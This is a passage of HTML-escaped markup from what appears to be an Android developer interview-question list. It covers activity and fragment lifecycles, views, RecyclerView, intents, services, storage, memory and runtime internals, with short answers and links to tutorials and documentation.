 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When only onDestroy is called for an activity without onPause() and onStop()?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=B2kY_ckZa-g"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Why do we need to call setContentView() in onCreate() of Activity class?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=U1aHAt7XC5I"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is onSaveInstanceState() and onRestoreInstanceState() in activity?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7301985158608392193-pA5M"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Fragment&lt;/code&gt; and its lifecycle?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/fragments/lifecycle"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Bundle in Android?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7355846437718413316-jRI4"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are "launchMode"?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/singletask-launchmode-in-android"&gt;Learn from here&lt;/a&gt; and &lt;a href="https://youtu.be/WYkQEnm4jeI"&gt;singleTask launchMode in Android&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between a &lt;code&gt;Fragment&lt;/code&gt; and an &lt;code&gt;Activity&lt;/code&gt;? Explain the relationship between the two.&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/10478233/why-fragments-and-when-to-use-fragments-instead-of-activities"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;When should you use a Fragment rather than an Activity?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;When you have some UI components to be used across various activities&lt;/li&gt; 
   &lt;li&gt;When multiple views can be displayed side by side just like ViewPager&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between FragmentPagerAdapter vs FragmentStatePagerAdapter?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;FragmentPagerAdapter: Each fragment visited by the user will be stored in the memory but the view will be destroyed. When the page is revisited, then the view will be created not the instance of the fragment.&lt;/li&gt; 
   &lt;li&gt;FragmentStatePagerAdapter: Here, the fragment instance will be destroyed when it is not visible to the user, except the saved state of the fragment.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between adding/replacing fragment in backstack?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/24466302/basic-difference-between-add-and-replace-method-of-fragment/24466345"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How would you communicate between two Fragments?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is retained &lt;code&gt;Fragment&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7265620144289193984-hlpH"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the purpose of &lt;code&gt;addToBackStack()&lt;/code&gt; while commiting fragment transaction?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;By calling addToBackStack(), the replace transaction is saved to the back stack so the user can reverse the transaction and bring back the previous fragment by pressing the Back button. For more &lt;a href="https://stackoverflow.com/questions/22984950/what-is-the-meaning-of-addtobackstack-with-null-parameter"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Views and ViewGroups&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Optimizing layouts in Android&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7269208182390951936-dAg3"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;View&lt;/code&gt; in Android?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Difference between &lt;code&gt;View.GONE&lt;/code&gt; and &lt;code&gt;View.INVISIBLE&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/11556607/android-difference-between-invisible-and-gone"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can you a create custom view? How?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are ViewGroups and how they are different from the Views?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;View: View objects are the basic building blocks of User Interface(UI) elements in Android. View is a simple rectangle box which responds to the user’s actions. Examples are EditText, Button, CheckBox etc. View refers to the android.view.View class, which is the base class of all UI classes.&lt;/li&gt; 
   &lt;li&gt;ViewGroup: ViewGroup is the invisible container. It holds View and ViewGroup. For example, LinearLayout is the ViewGroup that contains Button(View), and other Layouts also. ViewGroup is the base class for Layouts.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a Canvas?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_androiddev-android-activity-7324642674039291906-emlX"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;SurfaceView&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/reference/android/view/SurfaceView"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Relative Layout vs Linear Layout.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell about Constraint Layout optimization&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_constraintlayout-in-android-uses-the-cassowary-activity-7303624644165545993-xUBG"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Do you know what is the view tree? How can you optimize its depth?&lt;/strong&gt; - &lt;a href="https://developer.android.com/reference/android/view/ViewTreeObserver"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Displaying Lists of Content&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the difference between &lt;code&gt;ListView&lt;/code&gt; and &lt;code&gt;RecyclerView&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/26728651/recyclerview-vs-listview"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does the RecyclerView work?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7268187299811606528-u2_w"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;RecyclerView Optimization - Scrolling Performance Improvement&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/recyclerview-optimization"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Optimizing Nested RecyclerView&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/setrecycledviewpool-for-optimizing-nested-recyclerview"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How does RecyclerView improve performance over ListView?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the components of a RecyclerView?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain the role of RecyclerView.Adapter and RecyclerView.ViewHolder&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7274733205927182337-hvTG"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a LayoutManager in RecyclerView?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you handle multiple view types in a single RecyclerView?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is DiffUtil and how does it improve RecyclerView performance?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7279435764973686785-pfiQ"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the purpose of RecyclerView.setHasFixedSize(true)?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7282252857637007361-thzv/"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you update a specific item in RecyclerView?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;SnapHelper&lt;/code&gt;?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/snaphelper"&gt;SnapHelper&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Dialogs and Toasts&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Dialog&lt;/code&gt; in Android?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/topics/ui/dialogs"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Toast&lt;/code&gt; in Android?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/topics/ui/notifiers/toasts"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What the difference between &lt;code&gt;Dialog&lt;/code&gt; and &lt;code&gt;Dialog Fragment&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/7977392/android-dialogfragment-vs-dialog"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Intents and Broadcasting&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;Intent&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/intents-filters"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is an Implicit &lt;code&gt;Intent&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/intents-filters"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is an Explicit &lt;code&gt;Intent&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/intents-filters"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;BroadcastReceiver&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/broadcasts"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Describe how broadcasts and intents work to be able to pass messages around your app?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/7276537/using-a-broadcast-intent-broadcast-receiver-to-send-messages-from-a-service-to-a"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;PendingIntent&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;If you want someone to perform any Intent operation at future point of time on behalf of you, then we will use Pending Intent.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the different types of Broadcasts?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/broadcasts"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Services&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Android Service Lifecycle&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7265212180570992640-CJn_"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Service?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/services"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;On which thread does a Service run in Android?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7283717741130215424-Vn39"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Service vs IntentService&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/15524280/service-vs-intentservice-in-the-android-platform"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a Foreground Service?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_foreground-service-in-android-activity-7303268432030879745-TFVI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;JobScheduler&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/reference/android/app/job/JobScheduler"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How Does WorkManager Guarantee Task Execution?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_how-does-workmanager-guarantee-task-execution-activity-7320301933691310080-GpCR"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Inter-process Communication&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How can two distinct Android apps interact?&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/basics/intents"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Is it possible to run an Android app in multiple processes? How?&lt;/strong&gt; - &lt;a href="https://stackoverflow.com/questions/6567768/how-can-an-android-application-have-more-than-one-process"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is AIDL? Enumerate the steps in creating a bounded service through AIDL.&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/components/aidl"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What can you use for background processing in Android?&lt;/strong&gt; - &lt;a href="https://developer.android.com/guide/background"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;ContentProvider&lt;/code&gt; and what is it typically used for?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7268117553040764931-64fI"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Long-running Operations&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to run parallel tasks and get a callback when all are complete?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/long-running-tasks-in-parallel-with-kotlin-flow"&gt;Long-running tasks in parallel with Kotlin Flow&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is ANR? How can the ANR be prevented?&lt;/strong&gt; - &lt;a href="https://developer.android.com/topic/performance/vitals/anr.html"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;ThreadPool Advantages&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7371117281713508352-x2Uf"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Daemon Threads vs. User Threads&lt;/strong&gt; - &lt;a href="https://x.com/amitiitbhu/status/1817783254885478872"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain &lt;code&gt;Looper&lt;/code&gt;, &lt;code&gt;Handler&lt;/code&gt;, and &lt;code&gt;HandlerThread&lt;/code&gt;.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Garbage Collection&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_java-tech-softwareengineer-activity-7308111597581799425-qZN0"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Memory Leak vs Out of Memory(OOM) Error&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7344037400857219072-O_pe"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can you explain the difference between a Runnable and a Thread in Android?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_softwareengineer-androiddev-android-activity-7279784055284420609-Xa8b"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Working With Multimedia Content&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you handle bitmaps in Android as it takes too much memory?&lt;/strong&gt; - &lt;a href="https://developer.android.com/topic/performance/graphics/load-bitmap"&gt;Learn from here&lt;/a&gt; and &lt;a href="https://developer.android.com/topic/performance/graphics/manage-memory"&gt;here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Tell about the &lt;code&gt;Bitmap&lt;/code&gt; pool.&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/bitmap-pool"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Data Saving&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Jetpack DataStore Preferences&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/jetpack-datastore-preferences"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Persisting Data in an Android App&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7301836718003888128-oNi2"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is ORM? How does it work?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How would you preserve the &lt;code&gt;Activity&lt;/code&gt; state during a screen rotation?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=ORtieK5f_zg"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are different ways to store data in your Android app?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_outcomeschool-softwareengineer-tech-activity-7301836718003888128-oNi2"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Explain Scoped Storage in Android.&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to encrypt data in Android?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is commit() and apply() in SharedPreferences?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;commit() returns a boolean value of success or failure immediately by writing data synchronously.&lt;/li&gt; 
   &lt;li&gt;apply() is asynchronous and it won't return any boolean response. If you have an apply() outstanding and you are performing commit(), then the commit() will be blocked until the apply() is not completed.&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Look and Feel&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;Spannable&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is a &lt;code&gt;SpannableString&lt;/code&gt;?&lt;/strong&gt;&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;A SpannableString has immutable text, but its span information is mutable. Use a SpannableString when your text doesn't need to be changed but the styling does. Spans are ranges over the text that include styling information like color, highlighting, italics, links, etc&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the best practices for using text in Android?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to implement Dark mode in any application?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Memory Optimizations&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Improve Android App Performance&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_outcomeschool-softwareengineer-tech-activity-7314877712815345664-iB7z"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the &lt;code&gt;onTrimMemory()&lt;/code&gt; method?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/amit-shekhar-iitbhu_softwareengineer-androiddev-android-activity-7267752779727679488--kk4"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to identify and fix OutOfMemory issues?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How do you find memory leaks in Android applications?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Battery Life Optimizations&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;How to reduce battery usage in an Android application?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Doze? What about App Standby?&lt;/strong&gt; - &lt;a href="https://www.linkedin.com/posts/outcomeschool_androiddev-activity-7319939901418795008-KRql"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is &lt;code&gt;overdraw&lt;/code&gt;?&lt;/strong&gt; - &lt;a href="https://developer.android.com/topic/performance/rendering/overdraw.html"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Supporting Different Screen Sizes&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;How do you support different types of resolutions?&lt;/strong&gt; - &lt;a href="https://developer.android.com/training/multiscreen/screensizes"&gt;Learn from here&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Permissions&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;What are the different protection levels in permission?&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Native Programming&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is the NDK and why is it useful?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/ndk-and-renderscript"&gt;Android NDK and RenderScript&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is renderscript?&lt;/strong&gt; - Learn from here: &lt;a href="https://outcomeschool.com/blog/ndk-and-renderscript"&gt;Android NDK and RenderScript&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Android System Internal&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Android Runtime?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/dalvik-art-jit-aot"&gt;Android Runtime&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Dalvik, ART, JIT, and AOT in Android&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/dalvik-art-jit-aot"&gt;Dalvik, ART, JIT, and AOT&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What are the differences between Dalvik and ART?&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/dalvik-art-jit-aot"&gt;Difference between Dalvik and ART&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Baseline Profiles&lt;/strong&gt; - &lt;a href="https://outcomeschool.com/blog/dalvik-art-jit-aot"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is DEX?&lt;/strong&gt; - &lt;a href="https://developer.android.com/reference/dalvik/system/DexFile"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Multidex in Android?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=R0zd8lmHnmE"&gt;Learn from here&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Can you manually call the Garbage collector?&lt;/strong&gt; - &lt;a href="https://www.youtube.com/watch?v=fPEjpFKo1-Q"&gt;Is it possible to force Garbage Collection in Android?&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Android Jetpack&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;What is Android Jetpack and why to use this?&lt;/strong&gt;&lt;/p&gt; &lt;/li&gt; 
